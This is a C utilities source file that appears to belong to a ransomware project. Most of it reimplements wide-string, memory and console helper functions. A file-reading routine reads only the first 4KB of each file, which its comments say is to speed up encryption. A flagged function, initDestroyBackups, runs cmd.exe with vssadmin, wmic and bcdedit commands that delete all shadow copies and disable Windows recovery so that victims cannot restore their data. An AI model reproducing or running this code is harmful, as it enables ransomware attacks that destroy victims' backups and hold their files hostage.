#include "utils.h" // Contains the utils functions

// Own implementation of wcscmp
int _wcscmp(const wchar_t* s1, const wchar_t* s2) 
{
    while (*s1 && (*s1 == *s2)) {
        s1++, s2++;
    }
    return *s1 - *s2;
}

// Own implementation of wcslen
size_t _wcslen(const wchar_t* str) 
{
    size_t len = 0;
    while (*str++) {
        len++;
    }
    return len;
}

// Own implementation of wcsncmp
int _wcsncmp(const wchar_t* s1, const wchar_t* s2, size_t n) 
{
    while (n--) {
        if (*s1 != *s2) {
            return *s1 - *s2;
        }
        s1++;
        s2++;
    }
    return 0;
}

// Own implementation of wcsstr
wchar_t* _wcsstr(const wchar_t* haystack, const wchar_t* needle) 
{
    size_t needleLen = _wcslen(needle);
    while (*haystack) {
        if (_wcsncmp(haystack, needle, needleLen) == 0) {
            return (wchar_t*)haystack;
        }
        haystack++;
    }
    return NULL;
}

// Own implementation of wmemcpy
void* _wmemcpy(wchar_t* destination, const wchar_t* source, size_t count) 
{
    if (!destination || !source) {
        return NULL;
    }
    for (size_t i = 0; i < count; i++) {
        destination[i] = source[i];
    }
    return destination;
}

// Own implementation of wcscpy_s
errno_t _wcscpy_s(wchar_t* destination, size_t sizeInWords, const wchar_t* source) 
{
    if (!destination || sizeInWords == 0) {
        return EINVAL;
    }
    if (!source) {
        destination[0] = L'\0';
        return 0;
    }
    size_t sourceLen = _wcslen(source);
    if (sourceLen + 1 > sizeInWords) {
        destination[0] = L'\0';
        return ERANGE;
    }
    _wmemcpy(destination, source, sourceLen + 1);
    return 0;
}

// Own implementation of wcscat_s
errno_t _wcscat_s(wchar_t* destination, size_t sizeInWords, const wchar_t* source) 
{
    if (!destination || sizeInWords == 0) {
        return EINVAL;
    }
    if (!source) {
        destination[0] = L'\0';
        return 0;
    }
    size_t destLen = _wcslen(destination);
    size_t sourceLen = _wcslen(source);
    if (destLen + sourceLen + 1 > sizeInWords) {
        destination[0] = L'\0';
        return ERANGE;
    }
    _wcscpy_s(destination + destLen, sizeInWords - destLen, source);
    return 0;
}

// Own implementation of StringCchCatW
HRESULT _StringCchCatW(wchar_t* destination, size_t sizeInWords, const wchar_t* source) 
{
    if (!destination || sizeInWords == 0) {
        return E_INVALIDARG;
    }
    if (!source) {
        return S_OK;
    }
    size_t destLen = _wcslen(destination);
    size_t sourceLen = _wcslen(source);
    if (destLen + sourceLen + 1 > sizeInWords) {
        destination[0] = L'\0';
        return STRSAFE_E_INSUFFICIENT_BUFFER;
    }
    _wcscat_s(destination, sizeInWords, source);
    return S_OK;
}

// Own implementation of StringCchCopyW
HRESULT _StringCchCopyW(wchar_t* destination, size_t sizeInWords, const wchar_t* source) 
{
    if (!destination || sizeInWords == 0) {
        return E_INVALIDARG;
    }
    if (!source) {
        destination[0] = L'\0';
        return S_OK;
    }
    size_t sourceLen = _wcslen(source);
    if (sourceLen + 1 > sizeInWords) {
        destination[0] = L'\0';
        return STRSAFE_E_INSUFFICIENT_BUFFER;
    }
    _wcscpy_s(destination, sizeInWords, source);
    return S_OK;
}

void ShowDebugMessage(const WCHAR* prefix, const WCHAR* content) 
{
    WCHAR message[MAX_PATH];
    _StringCchCopyW(message, MAX_PATH, prefix);
    _StringCchCatW(message, MAX_PATH, content);

    MessageBoxW(NULL, message, L"Debug", MB_OK);
}

// Reverses a wstring 'str' of length 'len'
void reverse(wchar_t* str, int len)
{
    int i = 0, j = len - 1, temp;
    while (i < j) {
        temp = str[i];
        str[i] = str[j];
        str[j] = temp;
        i++;
        j--;
    }
}

// my_pow function calculates the power of a number
double my_pow(double base, int exponent) 
{
    double result = 1;
    while (exponent > 0) {
        if (exponent & 1) {
            result *= base;
        }
        exponent >>= 1;
        base *= base;
    }
    return result;
}
 
// Converts a given integer x to wstring str[].
// d is the number of digits required in the output.
// If d is more than the number of digits in x,
// then 0s are added at the beginning.
int intToWStr(int x, wchar_t str[], int d)
{
    int i = 0;
    while (x) {
        str[i++] = (x % 10) + '0';
        x = x / 10;
    }
 
    // If number of digits required is more, then
    // add 0s at the beginning
    while (i < d)
        str[i++] = '0';
 
    reverse(str, i);
    str[i] = '\0';
    return i;
}

void int_to_wchar(int num, wchar_t* str) {
    int temp = num;
    int len = 0;
    while (temp != 0) {
        temp /= 10;
        len++;
    }
    int i = len - 1;
    while (num != 0) {
        str[i--] = (num % 10) + L'0';
        num /= 10;
    }
    str[len] = L'\0';
}

void ftoa(float n, wchar_t* res, int afterpoint)
{
    // Extract integer part
    int ipart = (int)n;
 
    // Extract floating part
    float fpart = n - (float)ipart;
 
    // convert integer part to wstring
    int i = intToWStr(ipart, res, 0);
 
    // check for display option after point
    if (afterpoint != 0) {
        res[i] = '.'; // add dot
 
        // Get the value of fraction part upto given no.
        // of points after dot. The third parameter
        // is needed to handle cases like 233.007
        fpart = fpart * my_pow(10, afterpoint);
 
        intToWStr((int)fpart, res + i + 1, afterpoint);
    }
}

void strcpy_own(char* dest, const char* src) {
    DWORD i;
    for (i = 0; src[i] != '\0'; i++) {
        dest[i] = src[i];
    }
    dest[i] = '\0';
}

void strncpy_own(char* dest, const char* src, size_t n) {
    size_t i;
    for (i = 0; i < n && src[i] != '\0'; i++) {
        dest[i] = src[i];
    }
    for ( ; i < n; i++) {
        dest[i] = '\0';
    }
}

void strcat_own(char* dest, const char* src) {
    DWORD i, j;
    for (i = 0; dest[i] != '\0'; i++);
    for (j = 0; src[j] != '\0'; j++) {
        dest[i + j] = src[j];
    }
    dest[i + j] = '\0';
}

void memset_own(void* dest, int c, size_t n) {
    char* d = (char*)dest;
    for (size_t i = 0; i < n; i++) {
        d[i] = c;
    }
}

int strcmp_own(const char *s1, const char *s2)
{
    while(*s1 != '\0' && *s2 != '\0')
    {
        if(*s1 < *s2)
            return -1;
        else if(*s1 > *s2)
            return 1;
        s1++;
        s2++;
    }
    if(*s1 == '\0' && *s2 == '\0')
        return 0;
    else if(*s1 == '\0')
        return -1;
    else
        return 1;
}

size_t my_strlen(const char* str) {
    size_t len = 0;
    while (*str != '\0') {
        str++;
        len++;
    }
    return len;
}

int writeToConsoleA(const char* text)
{
    // Retrieve a handle to the console output
    HANDLE consoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);
    if (consoleOutput == INVALID_HANDLE_VALUE) 
    {
        return 101;
    }

    // Write the text to the console
    DWORD written;
    if (!WriteConsoleA(consoleOutput, text, (DWORD)my_strlen(text), &written, NULL)) 
    {
        return 102;
    }

    return 0;
}

int writeToConsoleW(const wchar_t* text)
{
    // Retrieve a handle to the console output
    HANDLE consoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);
    if (consoleOutput == INVALID_HANDLE_VALUE) 
    {
        return 101;
    }

    // Write the text to the console
    DWORD written;
    if (!WriteConsoleW(consoleOutput, text, (DWORD)_wcslen(text), &written, NULL)) 
    {
        return 102;
    }

    return 0;
}

void my_memcpy(void* dest, const void* src, int size) {
    char* d = (char*)dest;
    char* s = (char*)src;
    for (int i = 0; i < size; i++) {
        d[i] = s[i];
    }
}

wchar_t* _itowOwn(int value, wchar_t* buffer, int radix) {
    if (!buffer || (radix != 10)) {
        // This implementation only supports base 10 for simplicity
        return NULL;
    }

    wchar_t* ptr = buffer;
    wchar_t* ptr1 = buffer, tmp_char;
    int tmp_value;

    // Handle negative values for base 10
    if (value < 0 && radix == 10) {
        *ptr++ = L'-';
        value = -value;
    }

    // Conversion. Number is reversed.
    do {
        tmp_value = value;
        value /= radix;
        *ptr++ = L"0123456789abcdefghijklmnopqrstuvwxyz"[tmp_value - value * radix];
    } while (value);

    // Null terminate string
    *ptr-- = L'\0';

    // Reverse resulting string for base 10
    while (ptr1 < ptr) {
        tmp_char = *ptr;
        *ptr-- = *ptr1;
        *ptr1++ = tmp_char;
    }
    return buffer;
}

BOOL ReadFileWToByteArray(const WCHAR* szFileName, PBYTE* lpBuffer, PDWORD dwDataLen, PULONG64 dwFileSize)
{
    BOOL bResult = FALSE;
    HANDLE hFile = NULL;

    if( !szFileName || !lpBuffer || !dwDataLen || !dwFileSize )
    {
        goto Exit;
    }

    hFile = CreateFileW(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); // Open the file
    if( !hFile || hFile == INVALID_HANDLE_VALUE )
    {
        WCHAR szError[MAX_PATH] = {0};
		_itowOwn(GetLastError(), szError, 10);
		_StringCchCatW(szError, MAX_PATH, L" CreateFileW failed! (ReadFileWToByteArray)\n");
		writeToConsoleW(szError);
	    goto Exit;
    }

    LARGE_INTEGER liFileSize;
    LONGLONG fSize;
    // Check if the file is bigger than 4KB and set the size to only 4KB to speed up the encryption process
    if (GetFileSizeEx(hFile, &liFileSize)) // TODO: Make sure that files less then 4KB are encrypted correctly and not skipped
    {
        fSize = liFileSize.QuadPart;
        *dwFileSize = (ULONG64)fSize;
	    if ((DWORD)fSize > 4096) // If the file is bigger than 4KB, set the size to only 4KB
	    {
		    *dwDataLen = 4096; // 4KB == 0x1000 bytes
	    }
	    else
	    {
		    *dwDataLen = (DWORD)fSize;
	    }
    } 
    else 
    {
        goto Exit;
    }

    if( *dwDataLen == INVALID_FILE_SIZE || *dwDataLen == 0) 
    {
        writeToConsoleW(L"GetFileSize failed or file is too big\n");
        goto Exit;
    }

    *lpBuffer = (PBYTE)VirtualAlloc(NULL, *dwDataLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Allocate memory for the file

    if(!(*lpBuffer)) // Check if the memory allocation was successful
    {
        writeToConsoleW(L"VirtualAlloc failed\n");
        goto Exit;
    }

    DWORD dwBytesRead = 0;
    bResult = ReadFile(hFile, *lpBuffer, *dwDataLen, &dwBytesRead, NULL); // Read the file into the buffer
    if (!bResult)
    {
        VirtualFree(*lpBuffer, 0, MEM_RELEASE);
        *lpBuffer = NULL;
        goto Exit;
    }

Exit:
    if(hFile)
        CloseHandle(hFile);

    return bResult;
}
#ifdef DESTROY_BACKUPS
void initDestroyBackups()
{
    // Prevent restoration of the host from backups and recovery states
    WCHAR wCmd[MAX_PATH] = {0};
	wsprintfW(wCmd, L"/c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	ShellExecuteW(0, L"open", L"cmd.exe", wCmd, NULL, SW_SHOWNORMAL);
}
#endif